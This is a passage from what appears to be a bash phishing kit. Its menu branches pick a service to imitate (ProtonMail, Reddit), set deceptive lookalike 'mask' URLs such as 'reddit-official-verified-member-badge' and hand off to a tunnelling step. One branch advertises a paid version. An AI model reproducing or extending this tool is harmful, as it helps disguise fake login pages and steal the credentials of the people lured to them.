                        mask='http://protonmail-pro-basics-for-free'
                        tunnel_menu;;
                18)
                        echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
                19)
                        website="reddit"
                        mask='http://reddit-official-verified-member-badge'
                        tunnel_menu;;
                20)
